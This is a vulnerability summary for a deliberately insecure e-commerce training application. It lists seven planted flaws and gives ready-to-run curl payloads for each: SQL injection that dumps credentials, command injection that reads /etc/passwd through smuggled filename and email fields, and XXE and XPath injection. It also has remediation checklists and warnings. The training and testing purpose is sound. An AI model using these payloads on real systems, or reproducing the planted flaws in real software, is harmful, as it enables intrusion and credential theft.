# Vulnerabilities Summary

## Overview

This e-commerce application contains **7 intentional security vulnerabilities** for testing and educational purposes:

| # | Type | Endpoint | Auth Required | Severity |
|---|------|----------|---------------|----------|
| 1 | SQL Injection | `/api/products/search` | No | CRITICAL (9.8) |
| 2 | OS Command Injection | `/api/admin/system-info` | Admin | CRITICAL (10.0) |
| 3 | OS Command Injection | `/api/admin/export-logs` | Admin | CRITICAL (10.0) |
| 4 | OS Command Injection | `/api/admin/backup` | Admin | CRITICAL (10.0) |
| 5 | XXE Injection | `/api/reports/upload-sales` | Admin | HIGH (8.6) |
| 6 | XXE Injection | `/api/reports/import-products` | Admin | HIGH (8.6) |
| 7 | XPath Injection | `/api/search/users` | User | HIGH (8.1) |

## Quick Reference

### 1. SQL Injection
```bash
# Bypass authentication and extract all products
curl "http://localhost:3000/api/products/search?query=test' OR '1'='1"

# Extract user credentials
curl "http://localhost:3000/api/products/search?query=x' UNION SELECT id,email,password,first_name,last_name,phone,role,created_at FROM users--"
```

### 2. OS Command Injection - System Info
```bash
# Execute arbitrary system commands
curl -H "Authorization: Bearer ADMIN_TOKEN" \
  "http://localhost:3000/api/admin/system-info?command=cat /etc/passwd"
```

### 3. OS Command Injection - Log Export
```bash
# Inject commands via filename parameter
curl -X POST http://localhost:3000/api/admin/export-logs \
  -H "Authorization: Bearer ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename": "log.txt; whoami"}'
```

### 4. OS Command Injection - Backup
```bash
# Inject commands via email parameter
curl -X POST http://localhost:3000/api/admin/backup \
  -H "Authorization: Bearer ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"backupName": "backup", "email": "user@example.com; cat /etc/passwd"}'
```

### 5. XXE Injection - Sales Report
```bash
# Read local files via XXE
curl -X POST http://localhost:3000/api/reports/upload-sales \
  -H "Authorization: Bearer ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"xmlData": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><salesReport><reportName>&xxe;</reportName><period>Q1</period><totalSales>1000</totalSales></salesReport>"}'
```

### 6. XXE Injection - Product Import
```bash
# XXE attack via product import
curl -X POST http://localhost:3000/api/reports/import-products \
  -H "Authorization: Bearer ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"xmlContent": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><products><product><name>&xxe;</name><price>100</price><stock>10</stock></product></products>"}'
```

### 7. XPath Injection
```bash
# Bypass authentication and extract all users
curl -H "Authorization: Bearer USER_TOKEN" \
  "http://localhost:3000/api/search/users?username=admin' or '1'='1"
```

## Impact Summary

### SQL Injection
- **Confidentiality**: HIGH - Complete database read access
- **Integrity**: HIGH - Ability to modify data
- **Availability**: HIGH - Can delete data or crash database
- **Impact**: Exposure of user credentials, personal data, order history, payment info

### OS Command Injection (All 3)
- **Confidentiality**: HIGH - Read any file on the system
- **Integrity**: HIGH - Modify system files, install backdoors
- **Availability**: HIGH - Shut down services, delete data
- **Impact**: Complete system compromise, remote code execution, lateral movement

### XXE Injection (Both)
- **Confidentiality**: HIGH - Read local files, source code, credentials
- **Integrity**: MEDIUM - Limited through DTD manipulation
- **Availability**: MEDIUM - Denial of service via entity expansion
- **Impact**: File disclosure, SSRF attacks, information leakage

### XPath Injection
- **Confidentiality**: HIGH - Extract all XML data including sensitive fields
- **Integrity**: LOW - Cannot modify data
- **Availability**: LOW - Limited impact
- **Impact**: Exposure of user data, API keys, authentication bypass

## Remediation Checklist

### SQL Injection
- [ ] Replace string concatenation with parameterized queries
- [ ] Use prepared statements for all database interactions
- [ ] Implement input validation and sanitization
- [ ] Apply principle of least privilege to database users
- [ ] Enable query logging and monitoring
- [ ] Use ORM frameworks with built-in protection

### OS Command Injection
- [ ] Avoid executing shell commands with user input
- [ ] Use language-specific APIs instead of shell calls
- [ ] If shell execution necessary, use strict whitelisting
- [ ] Properly escape all user input
- [ ] Run application with minimal privileges
- [ ] Implement command execution logging

### XXE Injection
- [ ] Disable external entity processing in XML parsers
- [ ] Use JSON instead of XML when possible
- [ ] Update XML processing libraries
- [ ] Implement strict XML schema validation
- [ ] Use defusedxml or similar safe XML libraries
- [ ] Disable DTD processing entirely if not needed

### XPath Injection
- [ ] Use parameterized XPath queries
- [ ] Validate and sanitize all user input
- [ ] Use whitelist for allowed characters
- [ ] Consider switching to JSON/database for data storage
- [ ] Implement proper error handling that doesn't leak info
- [ ] Apply principle of least privilege to data access

## Testing Tools

### Automated Scanners
- **OWASP ZAP**: Full security scan
- **Burp Suite Pro**: Advanced vulnerability detection
- **SQLMap**: Specialized SQL injection testing
- **Nikto**: Web server scanner
- **Nmap + NSE**: Network and service scanning

### Manual Testing
- **cURL**: Command-line HTTP client
- **Postman**: API testing platform
- **Burp Suite Community**: Manual testing and interception
- **Browser DevTools**: Network inspection

### Exploitation Frameworks
- **Metasploit**: For command injection exploitation
- **SQLMap**: Automated SQL injection exploitation
- **XXEinjector**: Specialized XXE testing tool

## Security Best Practices

1. **Never trust user input** - Validate and sanitize all data
2. **Use parameterized queries** - Always use prepared statements
3. **Minimize attack surface** - Disable unnecessary features
4. **Principle of least privilege** - Run with minimal permissions
5. **Defense in depth** - Multiple layers of security
6. **Keep dependencies updated** - Patch vulnerabilities promptly
7. **Security logging** - Monitor for attack attempts
8. **Regular security audits** - Code review and penetration testing
9. **Secure configuration** - Follow security hardening guides
10. **Security training** - Educate developers on secure coding

## Documentation Files

- **README.md**: Application overview and setup
- **ALL_VULNERABILITIES.md**: Detailed exploitation guide
- **VULNERABILITY_DETAILS.md**: SQL injection specifics
- **SETUP_GUIDE.md**: Complete setup and testing instructions
- **test-vulnerabilities.sh**: Automated testing script

## Warning

⚠️ **This application is intentionally vulnerable and must never be:**
- Deployed to production environments
- Exposed to the internet
- Used with real user data
- Run outside of isolated testing environments

✅ **Appropriate uses:**
- Security training and education
- Penetration testing practice
- Vulnerability assessment demonstrations
- Secure code review exercises
- Security research in controlled environments

## License and Disclaimer

This software is provided for educational purposes only. The creators and contributors are not responsible for any misuse or damage caused by this application. Users are responsible for ensuring compliance with applicable laws and regulations when using this software.
